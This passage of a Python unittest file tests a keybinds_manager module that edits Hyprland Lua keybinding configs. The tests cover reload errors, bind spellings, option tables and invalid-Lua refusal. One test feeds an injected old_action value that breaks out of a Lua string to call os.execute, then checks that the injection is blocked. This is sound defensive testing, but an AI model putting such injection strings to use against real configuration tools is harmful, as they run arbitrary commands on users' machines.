        self._stub_set_keybinding()
        try:
            keybinds_manager.reload_hyprland = lambda: {
                "success": False, "reload_output": "", "config_errors": "bindings.lua:3 unexpected symbol"}
            self._write("")
            res = keybinds_manager.set_keybinding("SUPER + J", "j", "j")
            self.assertFalse(res["reload_success"])
            self.assertIn("unexpected symbol", res["reload_errors"])
        finally:
            self._unstub_set_keybinding()
            keybinds_manager.reload_hyprland = lambda: {
                "success": True, "reload_output": "", "config_errors": ""}

    # -- round-6 review: injection via old_action, spellings, defaults, opts -----

    def test_old_action_is_never_written_as_lua(self):
        self._stub_set_keybinding()
        try:
            marker = os.path.join(tempfile.mkdtemp(), "pwned")
            self._write('o.bind("SUPER + W", "Close", "x")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + W", "Close", "x", "", "SUPER + W", old_description="Close",
                old_command="x",
                old_action='"x") os.execute("touch ' + marker + '") --')
            self.assertFalse(res["success"], res)
            self.assertFalse(os.path.exists(marker))
            self.assertEqual(keybinds_manager._lua_compile_error(self._read()), "")
        finally:
            self._unstub_set_keybinding()

    def test_a_spaced_or_bracketed_bind_head_can_be_disabled(self):
        self._stub_set_keybinding()
        try:
            for spelling in ('o .bind([[SUPER + W]], "mine", "evil")',
                             'o["bind"]("SUPER + W", "mine", "evil")',
                             "o['bind']('SUPER + W', 'mine', 'evil')"):
                self._write(spelling + "\n")
                res = keybinds_manager.disable_keybinding("SUPER + W")
                self.assertTrue(res["success"], (spelling, res))
                live = [l for l in self._read().splitlines()
                        if "SUPER + W" in l and not l.strip().startswith("hl.unbind")]
                self.assertFalse(live, (spelling, self._read()))
        finally:
            self._unstub_set_keybinding()

    def test_a_shipped_default_row_can_be_edited_in_place(self):
        # The plugin's main operation: override a default at its own chord. The
        # duplicate proof used to read 0 -> 1 as a duplication and refuse.
        self._stub_set_keybinding()
        try:
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + RETURN", "description": "Terminal",
                 "command": "", "action": "o.launch_terminal()", "opts": "", "fn": "o.bind"}]
            self._write("")
            res = keybinds_manager.set_keybinding(
                "SUPER + RETURN", "Terminal edited", "", "o.launch_terminal()",
                "SUPER + RETURN", old_description="Terminal", old_command="",
                old_action="o.launch_terminal()")
            self.assertTrue(res["success"], res)
            self.assertEqual(self._read().count("o.bind("), 1)
        finally:
            self._unstub_set_keybinding()

    def test_call_form_and_options_table_are_preserved(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind_toggle("SUPER + T", "Touchpad", "touchpad")\n'
                        'o.bind("SUPER + K", "Vol", "vol-up", '
                        '{ locked = true, repeating = true })\n')
            r1 = keybinds_manager.set_keybinding(
                "SUPER + T", "Touchpad2", "touchpad", "", "SUPER + T",
                old_description="Touchpad", old_command="touchpad")
            r2 = keybinds_manager.set_keybinding(
                "SUPER + K", "Vol up", "vol-up", "", "SUPER + K",
                old_description="Vol", old_command="vol-up")
            content = self._read()
            self.assertTrue(r1["success"], r1)
            self.assertTrue(r2["success"], r2)
            self.assertIn("o.bind_toggle(", content)
            self.assertIn("repeating = true", content)
        finally:
            self._unstub_set_keybinding()

    def test_invalid_lua_is_refused_before_it_is_committed(self):
        if not (shutil.which("luac") or shutil.which("luac5.4")):
            self.skipTest("no Lua compiler installed")
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + W", "Close", "x")\n')
            before = self._read()
            res = keybinds_manager.set_keybinding(
                "SUPER + Y", "d", "", "hl.dsp.notify(1 2)")
            self.assertFalse(res["success"], res)
            self.assertIn("compile", res["error"])
            self.assertEqual(self._read(), before)
        finally:
            self._unstub_set_keybinding()

    def test_a_quote_leading_description_is_replaced_not_duplicated(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + W", "\\"vim\\" scratch", "gvim")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + W", '"vim" scratch 2', "gvim", "", "SUPER + W",
                old_description='"vim" scratch', old_command="gvim")
            self.assertTrue(res["success"], res)
            self.assertEqual(self._read().count("o.bind("), 1)
        finally:
            self._unstub_set_keybinding()

    def test_menu_reader_refuses_a_fifo(self):
        fifo = os.path.join(self._tmpdir.name, "omarchy-menu.jsonc")
        os.mkfifo(fifo)
        saved = keybinds_manager.MENU_CONFIG_PATH
        keybinds_manager.MENU_CONFIG_PATH = fifo
        try:
            res = keybinds_manager.check_menu_entry()
            self.assertFalse(res["success"])
            res = keybinds_manager.install_menu_entry()
            self.assertFalse(res["success"])
        finally:
            keybinds_manager.MENU_CONFIG_PATH = saved


if __name__ == "__main__":
    unittest.main()